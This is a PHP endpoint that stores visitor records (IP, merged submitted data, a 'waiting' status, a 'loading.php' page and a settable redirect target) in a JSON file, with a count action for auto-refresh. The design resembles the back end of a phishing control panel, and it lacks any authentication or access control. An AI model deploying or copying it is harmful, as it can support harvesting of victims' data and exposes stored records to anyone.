<?php
header('Content-Type: application/json');

$db_file = 'data/users.db';

// Create directory if not exists
if (!file_exists('data')) {
    mkdir('data', 0755, true);
}

// Initialize database if not exists
if (!file_exists($db_file)) {
    file_put_contents($db_file, json_encode([]));
}

$input = json_decode(file_get_contents('php://input'), true);
$users = json_decode(file_get_contents($db_file), true) ?: [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $input) {
    // Get user IP
    $user_ip = $_SERVER['REMOTE_ADDR'] ?? $input['ip'] ?? 'unknown';
    
    // Check if user with same IP already exists
    $existing_user_id = null;
    foreach ($users as $id => $user) {
        if (($user['ip'] ?? '') === $user_ip && (time() - ($user['last_seen'] ?? 0)) < 3600) {
            $existing_user_id = $id;
            break;
        }
    }
    
    // Use existing user ID or create new one
    if ($existing_user_id && !isset($input['user_id'])) {
        $user_id = $existing_user_id;
    } else {
        $user_id = $input['user_id'] ?? 'user_' . time() . '_' . bin2hex(random_bytes(4));
    }
    
    // Initialize user record
    if (!isset($users[$user_id])) {
        $users[$user_id] = [
            'id' => $user_id,
            'ip' => $user_ip,
            'data' => $input['data'] ?? [],
            'status' => $input['status'] ?? 'waiting',
            'current_page' => $input['current_page'] ?? 'loading.php',
            'redirect_to' => $input['redirect_to'] ?? '',
            'created_at' => time(),
            'last_seen' => time(),
            'last_updated' => time(),
            'history' => [],
            'country' => $input['country'] ?? 'Unknown'
        ];
    } else {
        // Update existing user
        $users[$user_id]['last_seen'] = time();
        $users[$user_id]['last_updated'] = time();
        
        if (isset($input['data']) && !empty($input['data'])) {
            $users[$user_id]['data'] = array_merge($users[$user_id]['data'] ?? [], $input['data']);
        }
        
        if (isset($input['status'])) {
            $users[$user_id]['status'] = $input['status'];
        }
        
        if (isset($input['redirect_to'])) {
            $users[$user_id]['redirect_to'] = $input['redirect_to'];
        }
    }
    
    // Save to file
    file_put_contents($db_file, json_encode($users, JSON_PRETTY_PRINT));
    echo json_encode(['success' => true, 'user_id' => $user_id, 'ip' => $user_ip]);
    exit;
}

// GET request to get user count (for auto-refresh)
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'get_count') {
    echo json_encode(['count' => count($users)]);
    exit;
}

echo json_encode(['success' => false, 'error' => 'Invalid request']);
?>